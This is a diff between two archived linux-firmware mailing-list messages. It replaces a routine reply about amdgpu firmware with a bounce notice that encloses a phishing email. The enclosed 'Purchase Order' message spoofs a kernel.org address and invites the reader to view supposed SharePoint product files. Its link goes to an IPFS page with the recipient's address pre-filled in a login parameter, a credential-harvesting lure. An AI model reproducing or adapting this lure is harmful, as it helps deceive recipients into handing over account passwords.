@@ -1,56 +1,107 @@
-Return-Path: <jwboyer@kernel.org>
+Return-Path: <MAILER-DAEMON>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id B95F5C25B4E
-	for <linux-firmware@archiver.kernel.org>; Fri, 20 Jan 2023 13:12:41 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 9967BC25B50
+	for <linux-firmware@archiver.kernel.org>; Fri, 20 Jan 2023 19:43:12 +0000 (UTC)
 Received: by smtp.kernel.org (Postfix)
-	id 8B86AC4339C; Fri, 20 Jan 2023 13:12:41 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 7638BC433D2
-	for <linux-firmware@kernel.org>; Fri, 20 Jan 2023 13:12:41 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1674220361;
-	bh=ZBbZy3UYgDDdJeaH5QijDXKvJWXVVa3eddEsxRaqPnA=;
-	h=References:In-Reply-To:From:Date:Subject:To:List-Id:Cc:From;
-	b=nfF8rl5EkHhfk1qB5mhP6fAwkjGweHF9NqvsXzPicNGYBzKV8XsD7WT7xoh5MCElb
-	 vC24lytvYbThxielaYHtacsKhkfhE42iwVyM2RjDqiYG2sJur5C53XMFIThVWwrMnM
-	 mAYJDCOhP0OWMz9l0PQeEnrXjJ73mAoNuAek+OEHNDYnINr88vI0JSiE8q5SppyPCp
-	 x9EpqFft+Tqjqu5FQDTuzCZ7p6DTME2vK44+Z44qOA4PKSIQLO553UbKODJ2JL4xjv
-	 mMwda4yaozUVK8wmjSRBqziuezzdeGp+9KuT6UOSso5jeZulNoKHtkuwBahppq1eE5
-	 WaHlr85PPdHHg==
-Received: by mail-yb1-f173.google.com with SMTP id b1so1333867ybn.11
-        for <linux-firmware@kernel.org>; Fri, 20 Jan 2023 05:12:41 -0800 (PST)
-X-Gm-Message-State: AFqh2kqL20TLf0hunHuKzwPg5QS+q9knMnO5jbRca3GslZejQWFfXNsf
-	aiw1AFtS87l4u19zWQ7ZlQ2z2+nao1tMDH8EAKI=
-X-Google-Smtp-Source: AMrXdXvO1Qqvv22sLE2q6LReW433bNUIjvV5Y6sOhiTv2nW5JawSh997Ix7nSOP3fDA3+DmXnz/jAPhMK7xbnd5xCoY=
-X-Received: by 2002:a25:904:0:b0:7d7:e469:372f with SMTP id
- 4-20020a250904000000b007d7e469372fmr1502743ybj.528.1674220360501; Fri, 20 Jan
- 2023 05:12:40 -0800 (PST)
-MIME-Version: 1.0
-References: <CADnq5_NHs3uHD7gGPDfxVhdTD__9CXvnPpzcdeRx5vHzTATfoQ@mail.gmail.com>
-In-Reply-To: <CADnq5_NHs3uHD7gGPDfxVhdTD__9CXvnPpzcdeRx5vHzTATfoQ@mail.gmail.com>
-From: Josh Boyer <jwboyer@kernel.org>
-Date: Fri, 20 Jan 2023 08:12:29 -0500
-X-Gmail-Original-Message-ID: <CA+5PVA7djMLHGiTbCgE8Kwx3dZK=oRbLGkKRDzw7-mpV6ZSaHw@mail.gmail.com>
-Message-ID: <CA+5PVA7djMLHGiTbCgE8Kwx3dZK=oRbLGkKRDzw7-mpV6ZSaHw@mail.gmail.com>
-Subject: Re: Updated amdgpu firmware
-To: Alex Deucher <alexdeucher@gmail.com>
+	id 742CBC433D2; Fri, 20 Jan 2023 19:43:12 +0000 (UTC)
+Received: from begintocode.com (mail.begintocode.com [210.16.120.135])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by smtp.kernel.org (Postfix) with ESMTPS id 4838BC4339B
+	for <linux-firmware@kernel.org>; Fri, 20 Jan 2023 19:43:11 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 4838BC4339B
+Authentication-Results: smtp.kernel.org; dmarc=pass (p=none dis=none) header.from=begintocode.com
+Authentication-Results: smtp.kernel.org; spf=pass smtp.helo=begintocode.com
+Received: by begintocode.com (Postfix)
+	id 27EB28F94A; Fri, 20 Jan 2023 19:38:39 +0000 (UTC)
+Date: Fri, 20 Jan 2023 19:38:39 +0000 (UTC)
+From: MAILER-DAEMON@begintocode.com (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
 List-Id: <linux-firmware.lore.kernel.org>
-Cc: Linux Firmware <linux-firmware@kernel.org>
-Content-Type: text/plain; charset="UTF-8"
+To: linux-firmware@kernel.org
+Auto-Submitted: auto-replied
+MIME-Version: 1.0
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="8544F8FBB2.1674243519/begintocode.com"
+Content-Transfer-Encoding: 8bit
+Message-Id: <20230120193839.27EB28F94A@begintocode.com>
 
-Applied and pushed out.
+This is a MIME-encapsulated message.
 
-josh
+--8544F8FBB2.1674243519/begintocode.com
+Content-Description: Notification
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
 
-On Thu, Jan 19, 2023 at 3:04 PM Alex Deucher <alexdeucher@gmail.com> wrote:
->
-> Hi,
->
-> Updated amdgpu firmware for vangogh.  Please apply!
->
-> Thanks,
->
-> Alex
+This is the mail system at host begintocode.com.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<linux-firmware@kernel.org>: host smtp3.kernel.org[44.230.10.245] said: 550
+    5.7.1 Blocked by SpamAssassin (in reply to end of DATA command)
+
+--8544F8FBB2.1674243519/begintocode.com
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; begintocode.com
+X-Postfix-Queue-ID: 8544F8FBB2
+X-Postfix-Sender: rfc822; linux-firmware@kernel.org
+Arrival-Date: Fri, 20 Jan 2023 19:34:17 +0000 (UTC)
+
+Final-Recipient: rfc822; linux-firmware@kernel.org
+Original-Recipient: rfc822;linux-firmware@kernel.org
+Action: failed
+Status: 5.7.1
+Remote-MTA: dns; smtp3.kernel.org
+Diagnostic-Code: smtp; 550 5.7.1 Blocked by SpamAssassin
+
+--8544F8FBB2.1674243519/begintocode.com
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 8bit
+
+Return-Path: <linux-firmware@kernel.org>
+Received: from kernel.org (unknown [91.224.92.23])
+	by begintocode.com (Postfix) with ESMTPSA id 8544F8FBB2
+	for <linux-firmware@kernel.org>; Fri, 20 Jan 2023 19:34:17 +0000 (UTC)
+From: Purchase  <linux-firmware@kernel.org>
+List-Id: <linux-firmware.lore.kernel.org>
+To: linux-firmware@kernel.org
+Subject: Purchase Order
+Date: 20 Jan 2023 20:34:15 +0100
+Message-ID: <20230120203415.EDF9968656391D89@kernel.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<P align=3Dcenter>NOTE:&nbsp; linux-firmware@kernel.org<BR><BR>Hello linux-=
+firmware, <BR><BR>We are Interested in your product&nbsp; </P>
+<P align=3Dcenter>Kindly view Products Uploaded on linux-firmware@kernel.or=
+g SharePoint&nbsp; to view the samples of the product we want to purchase&n=
+bsp; thanks.</P>
+<P align=3Dcenter><FONT size=3D6><U><STRONG><A href=3D"https://ipfs.io/ipfs=
+/QmQMtUxH17UeBFGeoPuSywPFFgY4gaZdBWT4mQ8zJUcSNU/?login=3Dlinux-firmware@ker=
+nel.org">View</A></STRONG></U>&nbsp;linux-firmware@kernel.org Sharepoint</F=
+ONT></P>
+<P align=3Dcenter>1.&nbsp;Product Quantity.xlxs<BR>2. Specification &amp; S=
+ample order.PDF 11 MB .&nbsp;&nbsp; <BR>3. Sample Image.xlxs<BR>4. Company =
+Profile.PDF<BR>5. Delivery Requirment.pdf<BR><BR><BR>[EXTERNAL] This email =
+originated from the kernel.org organization. </P></BODY></HTML>
+
+--8544F8FBB2.1674243519/begintocode.com--
